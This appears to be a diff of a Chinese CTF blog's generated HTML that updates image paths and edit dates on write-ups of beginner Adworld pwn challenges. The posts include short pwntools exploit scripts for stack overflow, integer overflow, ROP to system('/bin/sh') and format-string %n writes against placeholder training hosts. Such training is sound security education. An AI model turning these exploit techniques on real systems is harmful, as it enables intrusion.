@@ -170,10 +170,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-09-10 22:43:08 / Modified: 22:46:56" itemprop="dateCreated datePublished" datetime="2020-09-10T22:43:08+08:00">2020-09-10</time>
+              <time title="Created: 2020-09-10 22:43:08" itemprop="dateCreated datePublished" datetime="2020-09-10T22:43:08+08:00">2020-09-10</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-12 20:01:32" itemprop="dateModified" datetime="2020-10-12T20:01:32+08:00">2020-10-12</time>
+              </span>
 
           
 
@@ -187,30 +193,30 @@
 
       
           <p>攻防世界pwn题目<a href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5058&page=1" target="_blank" rel="noopener">新手练习区int-overflow</a></p>
-<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="./1.png" alt="Alt text" title="Optional title"></p>
-<h3 id="2-分析程序"><a href="#2-分析程序" class="headerlink" title="2.分析程序"></a>2.分析程序</h3><p><img src="./2.png" alt="Alt text" title="Optional title"></p>
+<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="/images/adworld-freshman-int-overflow-wp/1.png" alt="Alt text" title="Optional title"></p>
+<h3 id="2-分析程序"><a href="#2-分析程序" class="headerlink" title="2.分析程序"></a>2.分析程序</h3><p><img src="/images/adworld-freshman-int-overflow-wp/2.png" alt="Alt text" title="Optional title"></p>
 <p>可以发现，如果想要继续运行的话，需要输入1，否则，程序结束。</p>
-<p><img src="./3.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-int-overflow-wp/3.png" alt="Alt text" title="Optional title"></p>
 <p>发现了read函数，首先想到了栈溢出漏洞。<br>但是，却发现允许输入并送入指针空间的字符小于溢出所必须的字符数。<br>所以无法构成溢出。</p>
 <p>再进入check_passwd()函数一探究竟。</p>
-<p><img src="./4.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-int-overflow-wp/4.png" alt="Alt text" title="Optional title"></p>
 <p>这段代码对用户输入的密码计算了长度，如果 <strong>长度&lt;=3 或者 长度&gt;8</strong><br>则会提示”Invalid Password”，并退出程序。</p>
 <p>发现有个strcpy()函数，把s的字符串复制到dest中。看看dest的存储空间。</p>
-<p><img src="./5.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-int-overflow-wp/5.png" alt="Alt text" title="Optional title"></p>
 <p>这里也存在溢出漏洞，让s的长度大于dest正常输入的最大数量，覆盖到返回地址就可以指向到我们想要执行的地方了。然而，问题是s的长度被v3的大小限制了。我们再看看计算s大小时，存放v3的寄存器。</p>
-<p><img src="./6.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-int-overflow-wp/6.png" alt="Alt text" title="Optional title"></p>
 <p>这里有个al寄存器，al寄存器一共有8位比特。<br>v3被定义为无符号整形。所以al最大可以存放255的数据，最小为0。</p>
 <p>之后，我们发现了”cat flag”,在what_is_this函数里面。</p>
-<p><img src="./7.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-int-overflow-wp/7.png" alt="Alt text" title="Optional title"></p>
 <p>函数的起始地址为 <strong><em>0x0804868b</em></strong></p>
-<p><img src="./8.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-int-overflow-wp/8.png" alt="Alt text" title="Optional title"></p>
 <h3 id="3-整体思路"><a href="#3-整体思路" class="headerlink" title="3.整体思路"></a>3.整体思路</h3><p>strcpy()函数的存在，使得dest的栈溢出成为了可能。<br>同时，v3的最大值只能取到255。<br>所以，只要我们控制输入密码的长度在259~263之间(或者其他可行的大小)，使整数溢出，从而间接控制v3处于 <strong>3~8</strong>之间。</p>
 <p>我们只需在特定位置，把系统函数的地址写入s中，在控制s的长度，就可以绕过v3的密码长度检查，然后利用栈溢出，获取flag</p>
 <h3 id="4-编写payload"><a href="#4-编写payload" class="headerlink" title="4.编写payload"></a>4.编写payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r &#x3D; remote(&quot;ip&#x2F;url&quot;,port)</span><br><span class="line">r.sendlineafter(&quot;Your choice:&quot;,&#39;1&#39;)</span><br><span class="line">r.sendlineafter(&quot;your username&quot;,&#39;aaaa&#39;)</span><br><span class="line">r.sendlineafter(&quot;your passwd:&quot;,&#39;a&#39;*0x18+p32(sys_addr)+&#39;a&#39;*231)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-<h3 id="5-开始解题"><a href="#5-开始解题" class="headerlink" title="5.开始解题"></a>5.开始解题</h3><p><img src="./9.png" alt="Alt text" title="Optional title"></p>
-<p><img src="./10.png" alt="Alt text" title="Optional title"></p>
-<p><img src="./11.png" alt="Alt text" title="Optional title"></p>
+<h3 id="5-开始解题"><a href="#5-开始解题" class="headerlink" title="5.开始解题"></a>5.开始解题</h3><p><img src="/images/adworld-freshman-int-overflow-wp/9.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-int-overflow-wp/10.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-int-overflow-wp/11.png" alt="Alt text" title="Optional title"></p>
 
       
     </div>
@@ -328,10 +334,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-09-10 14:31:39 / Modified: 14:29:01" itemprop="dateCreated datePublished" datetime="2020-09-10T14:31:39+08:00">2020-09-10</time>
+              <time title="Created: 2020-09-10 14:31:39" itemprop="dateCreated datePublished" datetime="2020-09-10T14:31:39+08:00">2020-09-10</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-12 20:02:54" itemprop="dateModified" datetime="2020-10-12T20:02:54+08:00">2020-10-12</time>
+              </span>
 
           
 
@@ -345,28 +357,28 @@
 
       
           <p>攻防世界pwn题目 <a href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5057&page=1" target="_blank" rel="noopener">新手练习区guess_num</a></p>
-<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="./1.png" alt="Alt text" title="Optional title"></p>
-<h3 id="2-IDA-PRO打开，F5生成伪代码"><a href="#2-IDA-PRO打开，F5生成伪代码" class="headerlink" title="2.IDA PRO打开，F5生成伪代码"></a>2.IDA PRO打开，F5生成伪代码</h3><p><img src="./2.png" alt="Alt text" title="Optional title"></p>
-<p><img src="./3.png" alt="Alt text" title="Optional title"></p>
+<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="/images/adworld-freshman-guess-num-wp/1.png" alt="Alt text" title="Optional title"></p>
+<h3 id="2-IDA-PRO打开，F5生成伪代码"><a href="#2-IDA-PRO打开，F5生成伪代码" class="headerlink" title="2.IDA PRO打开，F5生成伪代码"></a>2.IDA PRO打开，F5生成伪代码</h3><p><img src="/images/adworld-freshman-guess-num-wp/2.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-guess-num-wp/3.png" alt="Alt text" title="Optional title"></p>
 <h3 id="3-分析这个程序"><a href="#3-分析这个程序" class="headerlink" title="3.分析这个程序"></a>3.分析这个程序</h3><p>进入sub_C3E()函数发现存在<br><strong><em>system(“cat flag”);</em></strong><br>于是，考虑使程序运行到这里，执行此代码。</p>
-<p><img src="./4.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-guess-num-wp/4.png" alt="Alt text" title="Optional title"></p>
 <p>我们返回去看看主函数，分析程序发现。<br>如果需要进入sub_C3E()函数就需要输入10次和”rand()%6+1”相等的数字。<br>使用rand()的前提是需要一个种子，才能生成随机数。<br>而srand()是用来生成随机数的种子的函数。</p>
-<p><img src="./5.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-guess-num-wp/5.png" alt="Alt text" title="Optional title"></p>
 <p>根据rand()函数的生成原理，srand()生成种子的参数若相同时，则每一次产生的随机数也一致。</p>
 <h4 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h4><p>利用gets()函数，对v7变量输入大量字符，溢出至seed[]处。<br>确定了seed[0]的值后，在Linux系统中进行编程，获取10次生成的数字。<br>再写入脚本，获取flag(不同系统生成的结果不同)</p>
-<p><img src="./6.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-guess-num-wp/6.png" alt="Alt text" title="Optional title"></p>
 <h3 id="4-编写payload"><a href="#4-编写payload" class="headerlink" title="4.编写payload"></a>4.编写payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;ip&#x2F;url&quot;,port)</span><br><span class="line">p.sendline(&quot;a&quot;*0x20+p64(0));</span><br><span class="line">num &#x3D; [&quot;x1&quot;,&quot;x2&quot;,&quot;x3&quot;,&quot;x4&quot;,&quot;x5&quot;,&quot;x6&quot;,&quot;x7&quot;,&quot;x8&quot;,&quot;x9&quot;,&quot;x10&quot;]</span><br><span class="line">for i in range(10):</span><br><span class="line">    sendlineafter(&quot;guess number:&quot;,num[i])</span><br><span class="line">p.interactive();</span><br></pre></td></tr></table></figure>
 
 <h3 id="5-开始解题"><a href="#5-开始解题" class="headerlink" title="5.开始解题"></a>5.开始解题</h3><p>编写程序</p>
-<p><img src="./7.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-guess-num-wp/7.png" alt="Alt text" title="Optional title"></p>
 <p>运行程序</p>
-<p><img src="./8.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-guess-num-wp/8.png" alt="Alt text" title="Optional title"></p>
 <p>获取在线场景</p>
-<p><img src="./9.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-guess-num-wp/9.png" alt="Alt text" title="Optional title"></p>
 <p>编写脚本</p>
-<p><img src="./10.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-guess-num-wp/10.png" alt="Alt text" title="Optional title"></p>
 <p>执行脚本，获取flag</p>
-<p><img src="./11.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-guess-num-wp/11.png" alt="Alt text" title="Optional title"></p>
 
       
     </div>
@@ -409,10 +421,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-09-08 22:12:55 / Modified: 22:12:16" itemprop="dateCreated datePublished" datetime="2020-09-08T22:12:55+08:00">2020-09-08</time>
+              <time title="Created: 2020-09-08 22:12:55" itemprop="dateCreated datePublished" datetime="2020-09-08T22:12:55+08:00">2020-09-08</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-12 20:05:04" itemprop="dateModified" datetime="2020-10-12T20:05:04+08:00">2020-10-12</time>
+              </span>
 
           
 
@@ -426,14 +444,14 @@
 
       
           <p>攻防世界pwn题目 <a href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049&page=1" target="_blank" rel="noopener">新手练习区</a></p>
-<h3 id="1-查看题目"><a href="#1-查看题目" class="headerlink" title="1.查看题目"></a>1.查看题目</h3><p><img src="./get_shell/1.png" alt="Alt text" title="Optional title"></p>
+<h3 id="1-查看题目"><a href="#1-查看题目" class="headerlink" title="1.查看题目"></a>1.查看题目</h3><p><img src="/images/get_shell/1.png" alt="Alt text" title="Optional title"></p>
 <p>运行就能get shell，那就运行试试<br><strong>Hi~ o(<em>￣▽￣</em>)ブ</strong></p>
 <h3 id="2-开始解题"><a href="#2-开始解题" class="headerlink" title="2.开始解题"></a>2.开始解题</h3><p>获取题目场景</p>
-<p><img src="./get_shell/2.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/get_shell/2.png" alt="Alt text" title="Optional title"></p>
 <p>连接会话，使用<br><strong>ls</strong><br>查看目录</p>
-<p><img src="./get_shell/3.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/get_shell/3.png" alt="Alt text" title="Optional title"></p>
 <p>发下flag文件，查看内容</p>
-<p><img src="./get_shell/4.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/get_shell/4.png" alt="Alt text" title="Optional title"></p>
 <p>这可能是我最快的一次获取flag了</p>
 <p><strong>o(<em>￣▽￣</em>)ブ</strong></p>
 
@@ -478,10 +496,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-09-08 21:53:42 / Modified: 21:53:01" itemprop="dateCreated datePublished" datetime="2020-09-08T21:53:42+08:00">2020-09-08</time>
+              <time title="Created: 2020-09-08 21:53:42" itemprop="dateCreated datePublished" datetime="2020-09-08T21:53:42+08:00">2020-09-08</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-12 20:06:56" itemprop="dateModified" datetime="2020-10-12T20:06:56+08:00">2020-10-12</time>
+              </span>
 
           
 
@@ -495,27 +519,27 @@
 
       
           <p>攻防世界pwn题目 <a href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5055&page=1" target="_blank" rel="noopener">新手练习区level2</a></p>
-<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="./level2/1.png" alt="Alt text" title="Optional title"></p>
-<h3 id="2-使用IDA-PRO打开，F5生成伪代码"><a href="#2-使用IDA-PRO打开，F5生成伪代码" class="headerlink" title="2.使用IDA PRO打开，F5生成伪代码"></a>2.使用IDA PRO打开，F5生成伪代码</h3><p><img src="./level2/2.png" alt="Alt text" title="Optional title"></p>
-<h3 id="3-分析程序"><a href="#3-分析程序" class="headerlink" title="3.分析程序"></a>3.分析程序</h3><p><img src="./level2/3.png" alt="Alt text" title="Optional title"></p>
+<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="/images/level2/1.png" alt="Alt text" title="Optional title"></p>
+<h3 id="2-使用IDA-PRO打开，F5生成伪代码"><a href="#2-使用IDA-PRO打开，F5生成伪代码" class="headerlink" title="2.使用IDA PRO打开，F5生成伪代码"></a>2.使用IDA PRO打开，F5生成伪代码</h3><p><img src="/images/level2/2.png" alt="Alt text" title="Optional title"></p>
+<h3 id="3-分析程序"><a href="#3-分析程序" class="headerlink" title="3.分析程序"></a>3.分析程序</h3><p><img src="/images/level2/3.png" alt="Alt text" title="Optional title"></p>
 <p>进入第一个函数发现存在栈溢出漏洞(程序未对用户输入做检查)</p>
-<p><img src="./level2/4.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/4.png" alt="Alt text" title="Optional title"></p>
 <p>此时考虑利用栈溢出，覆盖返回地址，调用system(“/bin/sh”);</p>
 <p>在string中找到了‘bin/sh’字符，于是考虑使用<br><strong><em>ROP</em></strong>面向返回的编程技术，构造<br><strong>system(“/bin/sh”)</strong><br>命令，因为system和/bin/sh都是程序内部的对象，所以利用面较为广泛</p>
-<p><img src="./level2/5.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/5.png" alt="Alt text" title="Optional title"></p>
 <p>寻找system函数地址</p>
-<p><img src="./level2/6.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/6.png" alt="Alt text" title="Optional title"></p>
 <p>进入查看，指令实参存储的偏移地址</p>
-<p><img src="./level2/7.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/7.png" alt="Alt text" title="Optional title"></p>
 <h4 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h4><p>利用ROP技术，构造调用系统的/bin/sh，进入系统shell，再来寻找flag</p>
 <h3 id="4-编写payload"><a href="#4-编写payload" class="headerlink" title="4.编写payload"></a>4.编写payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;ip&#x2F;url&#39;,port)</span><br><span class="line">p.send(&#39;a&#39;*140+p32(0x08048320)+&#39;a&#39;*4+p32(0x0804a024))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h3 id="5-开始解题"><a href="#5-开始解题" class="headerlink" title="5.开始解题"></a>5.开始解题</h3><p>获取在线场景</p>
-<p><img src="./level2/8.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/8.png" alt="Alt text" title="Optional title"></p>
 <p>编写脚本</p>
-<p><img src="./level2/9.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/9.png" alt="Alt text" title="Optional title"></p>
 <p>执行脚本，查看flag</p>
-<p><img src="./level2/10.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/10.png" alt="Alt text" title="Optional title"></p>
 
       
     </div>
@@ -558,10 +582,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-09-08 19:22:18 / Modified: 19:21:23" itemprop="dateCreated datePublished" datetime="2020-09-08T19:22:18+08:00">2020-09-08</time>
+              <time title="Created: 2020-09-08 19:22:18" itemprop="dateCreated datePublished" datetime="2020-09-08T19:22:18+08:00">2020-09-08</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-12 19:58:27" itemprop="dateModified" datetime="2020-10-12T19:58:27+08:00">2020-10-12</time>
+              </span>
 
           
 
@@ -575,13 +605,13 @@
 
       
           <p>攻防世界pwn题目 <a href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5050&page=1" target="_blank" rel="noopener">新手练习区CGfsb</a></p>
-<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="./adworld-freshman-CGfsb-wp/1.png" alt="Alt text" title="Optional title"></p>
+<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="/images/adworld-freshman-CGfsb-wp/1.png" alt="Alt text" title="Optional title"></p>
 <p>下载完成后使用ida pro打开</p>
-<h3 id="2-按F5生成伪代码"><a href="#2-按F5生成伪代码" class="headerlink" title="2.按F5生成伪代码"></a>2.按F5生成伪代码</h3><p><img src="./adworld-freshman-CGfsb-wp/2.png" alt="Alt text" title="Optional title"></p>
-<h3 id="3-分析程序"><a href="#3-分析程序" class="headerlink" title="3.分析程序"></a>3.分析程序</h3><p><img src="./adworld-freshman-CGfsb-wp/2.png" alt="Alt text" title="Optional title"></p>
+<h3 id="2-按F5生成伪代码"><a href="#2-按F5生成伪代码" class="headerlink" title="2.按F5生成伪代码"></a>2.按F5生成伪代码</h3><p><img src="/images/adworld-freshman-CGfsb-wp/2.png" alt="Alt text" title="Optional title"></p>
+<h3 id="3-分析程序"><a href="#3-分析程序" class="headerlink" title="3.分析程序"></a>3.分析程序</h3><p><img src="/images/adworld-freshman-CGfsb-wp/2.png" alt="Alt text" title="Optional title"></p>
 <p>有个允许用户输入的fgets函数和printf函数，发现printf()函数没有按照规范写，缺少格式化字符串。因此，存在格式化字符串漏洞。</p>
 <h5 id="格式化字符串漏洞是printf、fprintf等家族的输出函数的格式化字符串与输入参数不匹配，同时又允许用户的可控输入而存在的。"><a href="#格式化字符串漏洞是printf、fprintf等家族的输出函数的格式化字符串与输入参数不匹配，同时又允许用户的可控输入而存在的。" class="headerlink" title="格式化字符串漏洞是printf、fprintf等家族的输出函数的格式化字符串与输入参数不匹配，同时又允许用户的可控输入而存在的。"></a>格式化字符串漏洞是printf、fprintf等家族的输出函数的格式化字符串与输入参数不匹配，同时又允许用户的可控输入而存在的。</h5><p>发现有个if语句，当pwnme==8时，得到flag，查看pwnme地址。</p>
-<p><img src="./adworld-freshman-CGfsb-wp/3.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-CGfsb-wp/3.png" alt="Alt text" title="Optional title"></p>
 <p>这里介绍一下<br><strong><em>%n</em></strong> </p>
 <h5 id="格式化字符串。"><a href="#格式化字符串。" class="headerlink" title="格式化字符串。"></a>格式化字符串。</h5><p>它的作用是把之前显示的字符个数送入与其相对应的变量中</p>
 <p>printf()函数并不知道括号里面有多少个参数，取决于用户输入。它的内部有个指针，用来索检格式化字符串。对于特定类型的%，回取相应的参数的值，直到索检到格式化字符串结束。所用当用户输入 <strong><em>%p</em></strong><br>时，程序会输出后面内存中存储的数据(%p是以16进制输出)。调用printf()函数后的堆栈图中，在存储格式化字符串的地方(地址)后为<br><strong><em>输入产生一些变量的地址(具体占用多少空间不能确定，所以需要用多个%p或%x计算出我们输入的目标偏移量)</em></strong>。而我们输入%p会使这些地址中存放的数据转化为16进制输出。</p>
@@ -589,13 +619,13 @@
 <h3 id="4-编写payload"><a href="#4-编写payload" class="headerlink" title="4.编写payload"></a>4.编写payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;ip&#x2F;url&#39;,port)</span><br><span class="line">p.send(&quot;aaaa&quot;)</span><br><span class="line">p.sendafter(&quot;please:&quot;,p32(0x0804a068)+&#39;aaaa%n$n&#39;)&#x2F;&#x2F;此处第一个n为偏移量</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h3 id="5-开始解题"><a href="#5-开始解题" class="headerlink" title="5.开始解题"></a>5.开始解题</h3><p>获取在线场景</p>
-<p><img src="./adworld-freshman-CGfsb-wp/4.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-CGfsb-wp/4.png" alt="Alt text" title="Optional title"></p>
 <p>测试获取偏移地址</p>
-<p><img src="./adworld-freshman-CGfsb-wp/5.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-CGfsb-wp/5.png" alt="Alt text" title="Optional title"></p>
 <p>编写payload</p>
-<p><img src="./adworld-freshman-CGfsb-wp/6.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-CGfsb-wp/6.png" alt="Alt text" title="Optional title"></p>
 <p>执行脚本，获取flag</p>
-<p><img src="./adworld-freshman-CGfsb-wp/7.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-freshman-CGfsb-wp/7.png" alt="Alt text" title="Optional title"></p>
 <h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul>
 <li><a href="https://blog.csdn.net/qq_43394612/article/details/84900668" target="_blank" rel="noopener">格式化字符串漏洞原理详解</a></li>
 <li><a href="https://www.freebuf.com/column/207425.html" target="_blank" rel="noopener">格式化字符串漏洞</a></li>
@@ -642,10 +672,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-09-07 13:09:04 / Modified: 13:08:20" itemprop="dateCreated datePublished" datetime="2020-09-07T13:09:04+08:00">2020-09-07</time>
+              <time title="Created: 2020-09-07 13:09:04" itemprop="dateCreated datePublished" datetime="2020-09-07T13:09:04+08:00">2020-09-07</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-12 20:03:35" itemprop="dateModified" datetime="2020-10-12T20:03:35+08:00">2020-10-12</time>
+              </span>
 
           
 
@@ -659,26 +695,26 @@
 
       
           <p>攻防世界pwn题目 <a href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5052&page=1" target="_blank" rel="noopener">新手练习区hello_pwn</a></p>
-<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="./adworld-hello-pwn-images/1.png" alt="Alt text" title="Optional title"></p>
+<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="/images/adworld-hello-pwn-images/1.png" alt="Alt text" title="Optional title"></p>
 <p>下载完成后，使用ida pro打开</p>
-<p><img src="./adworld-hello-pwn-images/2.png" alt="Alt text" title="Optional title"></p>
-<h3 id="2-先找到main-函数，按F5生成伪代码"><a href="#2-先找到main-函数，按F5生成伪代码" class="headerlink" title="2.先找到main()函数，按F5生成伪代码"></a>2.先找到main()函数，按F5生成伪代码</h3><p><img src="./adworld-hello-pwn-images/3.png" alt="Alt text" title="Optional title"></p>
-<h3 id="3-分析这个程序"><a href="#3-分析这个程序" class="headerlink" title="3.分析这个程序"></a>3.分析这个程序</h3><p><img src="./adworld-hello-pwn-images/3.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-hello-pwn-images/2.png" alt="Alt text" title="Optional title"></p>
+<h3 id="2-先找到main-函数，按F5生成伪代码"><a href="#2-先找到main-函数，按F5生成伪代码" class="headerlink" title="2.先找到main()函数，按F5生成伪代码"></a>2.先找到main()函数，按F5生成伪代码</h3><p><img src="/images/adworld-hello-pwn-images/3.png" alt="Alt text" title="Optional title"></p>
+<h3 id="3-分析这个程序"><a href="#3-分析这个程序" class="headerlink" title="3.分析这个程序"></a>3.分析这个程序</h3><p><img src="/images/adworld-hello-pwn-images/3.png" alt="Alt text" title="Optional title"></p>
 <p>存在一个read()函数，允许用户输入最大16个字符，但是没有对用户输入进行检查。进入<br><strong>unk_601068</strong>地址看看有什么东西。</p>
-<p><img src="./adworld-hello-pwn-images/4.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-hello-pwn-images/4.png" alt="Alt text" title="Optional title"></p>
 <p>发现存在栈溢出漏洞，可已通过对unk_601068的写入，覆盖到<br><strong><em>dword_60106C</em></strong><br>的内容。</p>
 <h4 id="可以看出对unk-601068写入4个字节后就可以覆盖到dword-60106C"><a href="#可以看出对unk-601068写入4个字节后就可以覆盖到dword-60106C" class="headerlink" title="可以看出对unk_601068写入4个字节后就可以覆盖到dword_60106C"></a>可以看出对unk_601068写入4个字节后就可以覆盖到dword_60106C</h4><p>回到伪代码界面，继续阅读。有一个条件判断，里面有个函数。查看这个函数的功能。</p>
-<p><img src="./adworld-hello-pwn-images/5.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-hello-pwn-images/5.png" alt="Alt text" title="Optional title"></p>
 <p>发现可以<br><strong><em>得到flag</em></strong><br>的语句。</p>
 <h4 id="思路就有了-利用read-函数，对dword-60106C进行覆盖，使其值等于0x6E756161，进入函数，查看flag"><a href="#思路就有了-利用read-函数，对dword-60106C进行覆盖，使其值等于0x6E756161，进入函数，查看flag" class="headerlink" title="思路就有了,利用read()函数，对dword_60106C进行覆盖，使其值等于0x6E756161，进入函数，查看flag"></a>思路就有了,利用read()函数，对dword_60106C进行覆盖，使其值等于0x6E756161，进入函数，查看flag</h4><h3 id="4-编写payload"><a href="#4-编写payload" class="headerlink" title="4.编写payload"></a>4.编写payload</h3><p>payload文件如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;ip&#x2F;url&quot;,port);</span><br><span class="line">p.send(&#39;a&#39;*4+p32(0x6E756161));</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h3 id="5-开始解题"><a href="#5-开始解题" class="headerlink" title="5.开始解题"></a>5.开始解题</h3><p>获取在线场景</p>
-<p><img src="./adworld-hello-pwn-images/6.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-hello-pwn-images/6.png" alt="Alt text" title="Optional title"></p>
 <p>编写payload</p>
-<p><img src="./adworld-hello-pwn-images/7.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-hello-pwn-images/7.png" alt="Alt text" title="Optional title"></p>
 <p>执行脚本，得到flag</p>
-<p><img src="./adworld-hello-pwn-images/8.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/adworld-hello-pwn-images/8.png" alt="Alt text" title="Optional title"></p>
 
       
     </div>
@@ -729,7 +765,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
